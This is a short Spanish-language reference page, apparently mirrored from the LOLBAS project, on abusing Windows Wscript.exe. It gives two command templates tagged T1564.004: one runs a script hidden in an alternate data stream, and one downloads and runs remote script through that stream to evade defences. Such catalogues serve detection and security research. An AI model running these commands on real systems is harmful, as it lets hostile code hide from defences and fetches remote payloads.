# LOLBAS: Wscript.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `ADS`

Used by Windows to execute scripts

## Comandos

### Execute hidden code to evade defensive counter measures

ADS · priv: User · T1564.004

```cmd
wscript //e:vbscript {PATH}:script.vbs
```

Execute script stored in an alternate data stream

### Execute hidden code to evade defensive counter measures

ADS · priv: User · T1564.004

```cmd
echo GetObject("script:{REMOTEURL:.js}") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js
```

Download and execute script stored in an alternate data stream

